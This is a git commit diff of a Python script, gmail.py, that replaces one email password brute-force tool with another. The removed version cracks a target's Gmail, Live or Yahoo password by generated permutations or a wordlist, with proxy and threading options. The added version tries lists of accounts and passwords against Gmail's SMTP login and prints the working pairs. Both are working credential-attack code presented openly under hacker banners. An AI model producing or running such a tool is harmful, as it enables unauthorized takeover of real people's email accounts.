a72512b027823caddec69836a1ed2ba1b309b7b4
doprofnet <47696303+toying78@users.noreply.github.com>
2020-11-23 13:46:53 +0700

    Update gmail.py

--- gmail.py
+++ gmail.py
@@ -1,143 +1,79 @@
-####import smtplib
-####import itertools
-###import os
-####from time import sleep
-####from threading import *
-#####from colorama import init
-init()
+#!/usr/bin/python
+from __future__ import absolute_import
+from __future__ import print_function
+from six.moves import input
+import smtplib
 
-print("         _                           ______                                 ")
-print("	| |                         (____  \             _               ")
-print("	| |      ____ _____ _   _    ____)  ) ____ _   _| |_  ____  ____ ")
-print("	| |     / _  (___  ) | | |  |  __  ( / ___) | | |  _)/ _  )/ ___)")
-print("	| |____( ( | |/ __/| |_| |  | |__)  ) |   | |_| | |_( (/ /| |     ")  
-print("	|_______)_||_(_____)\__  |  |______/|_|    \____|\___)____)_|   ")
-print("	                   (____/                                      ")
-																															  
-print		("\nThis tool is a bruter tool that is meant to crack email password.")
-print                    ("[+] Coded by The Browser Pirates [+]")
-#all data input begins here	
-proxyconfirm = input ('Do you want to enable proxy? [y/n]: ')
-if proxyconfirm == "y":
-	print ('\033[32m'+"Opening a new shell to generate proxies...")
-	os.system('start cmd /D /C "py proxychanger.py"')
-	
-if proxyconfirm == "n":
-    print('\033[31m' + 'Proxies not activated.')
-    pass
-print('\033[39m')
-user = input("Enter Target's Email Address: ")	
-if 'gmail' in user:
-    server = "gmail"
-    port = 587
-elif 'live' in user:
-    server = "live"
-    port = 587
-elif 'yahoo' in user:
-    server = "yahoo"
-    port = 587
-else:
-    server = input ("Enter Email Service name [ex: gmail]: ")
-    port = int(input("Enter the SMTP port [default: 587]: "))
+class GmailBruteForce():
+    def __init__(self):
+        self.accounts = []
+        self.passwords = []
+        self.init_smtplib()
 
-print('\033[35m' +"Connecting...")
-print('\033[37m')
-smtpserver_server = smtplib.SMTP("smtp."+server+".com",port)
-smtpserver_server.ehlo()
-smtpserver_server.starttls()
-smtpserver_server.ehlo() #this will avoid connection refuses
-print("Connected to SMTP server. Ready to perform an attack.")
+    def get_acc_list(self,path):
+        file = open(path, 'r',encoding='utf8').read().splitlines()
+        for line in file:
+            self.accounts.append(line)
 
-method = input("\nChoose method to attack => (a)Brute Force (b)Dictionary : ")
-if method == "a":
-    min_pass = int(input("Enter the minimum number of password you want to start the Brute-Force(Default:8): "))
-    print ("\nYou are about to attack this email: "+'\033[43m'+user)
-    print('\033[37m')
-    verify2 = input ("Do you want to continue? [y/n]: ")
-    if verify2 == "y" or verify2 == "Y":
-        def print_perms(chars, minlen, maxlen): 
-            for n in range(minlen, maxlen+1): 
-                for perm in itertools.product(chars, repeat=n): 
-                    print(''.join(perm)) 
-            
-    print_perms ("abcdefghijklmnopqrstuvwxyz1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 90)
+    def get_pass_list(self,path):
+        file = open(path, 'r',encoding='utf8').read().splitlines()
+        for line in file:
+            self.passwords.append(line)
 
-    for password in print_perms:
-        try:
-            smtpserver_server.login(user, password)
-            print ('\033[33m'+"[+] Password Cracked: "+'\033[34m'+ password)
-            print('\033[39m')
-            input("Press Enter to save the result in .txt")
-            file = open("password cracked.txt","w")
-            file.write("Email: ")
-            file.write(user)
-            file.write("    Password: ")
-            file.write(password)
-            file.close()
-            input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
-            break
-			
-        except smtplib.SMTPAuthenticationError:
-            print ('\033[31m'+"[!] Password Inccorect: "+'\033[32m'+ password)
-			
-    if verify2 == "n" or verify2 == "N":   
-        quit()
+    def init_smtplib(self):
+        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
+        self.smtp.starttls()
+        self.smtp.ehlo()
+    
+    def try_gmail(self):
 
-#this class is in the middle of the script, so as to make sure it gets all the attributes
-class Core1(Thread):
-    def run(self):
-        for password in passwfile:
-            try:
-                smtpserver_server.login(user, password)
-                print ('\033[33m'+"[+] Password Cracked: "+'\033[34m'+ password)
-                print('\033[39m')
-                input("Press Enter to save the result in .txt")
-                file = open("password cracked.txt","w")
-                file.write("Email: ")
-                file.write(user)
-                file.write("    Password: ")
-                file.write(password)
-                file.close()
-                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
-                t1.join()
-                t2.join()
-                break
-				
-            except smtplib.SMTPAuthenticationError:
-                print ('\033[31m'+"[!] Incorrect Password: "+ password)
+        for user in self.accounts:
+            for password in self.passwords:
+                try:
+                    self.smtp.login(user,password)
+                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
+                    self.smtp.quit()
+                    self.init_smtplib()
+                    break;
+                except smtplib.SMTPAuthenticationError:
+                    # print("\033[1;31msorry \033[1;m")
+                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
 
-class Core2(Thread):		
-    def run(self):
-        for password in reversedpasswfile:
-            try:
-                smtpserver_server.login(user, password)
-                print ('\033[33m'+"[+] Password Cracked: "+'\033[34m'+ password)
-                print('\033[39m')
-                input("Press Enter to save the result in .txt")
-                file = open("password cracked.txt","w")
-                file.write("Email: ")
-                file.write(user)
-                file.write("    Password: ")
-                file.write(password)
-                file.close()
-                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
-                t1.join()
-                t2.join()
-                break
-				
-            except smtplib.SMTPAuthenticationError:
-                print ('\033[31m'+"[!] Incorrect Password: "+ password)
+print('''
+	==================================
+	|      [Gmail] ==> 3             |
+	|--------------------------------|
+	| snapchat: flaah999             |
+	| CoDeD By TA Hacker (@0xfff0800)|
+	|--------------------------------|
+	''')
 
-if method == "b":
-    passwfile = input("Enter the Wordlist Path: ")
-    passwfile = open(passwfile, "r")
-    reversedpasswfile = input("Enter the Wordlist Path one more time: ")
-    with open(reversedpasswfile) as f,  open('reversed_wordlist.txt', 'w') as fout:
-        fout.writelines(reversed(f.readlines()))
-    reversedpasswfile = open("reversed_wordlist.txt", "r")
-    t1 = Core1()
-    t2 = Core2()
-	
-    t1.start()
-    sleep(0.001)
-    t2.start()
+instance = GmailBruteForce()
+
+do = input('''
+		Choose any number ?
+		1 - Email file
+		2 - target email
+		
+		==> ''')
+
+if do == '1':
+    user = input("List Of Usernames => ")
+    passfile = input("List Of Passwords => ")
+
+    instance.get_acc_list(user)
+    instance.get_pass_list(passfile)
+    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+    instance.try_gmail()
+   
+############
+if do == '2':
+    user = input("email : ")
+    senha = input("passlist : ")
+    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+    instance.accounts.append(user)
+    instance.get_pass_list(senha)
+
+    instance.try_gmail()
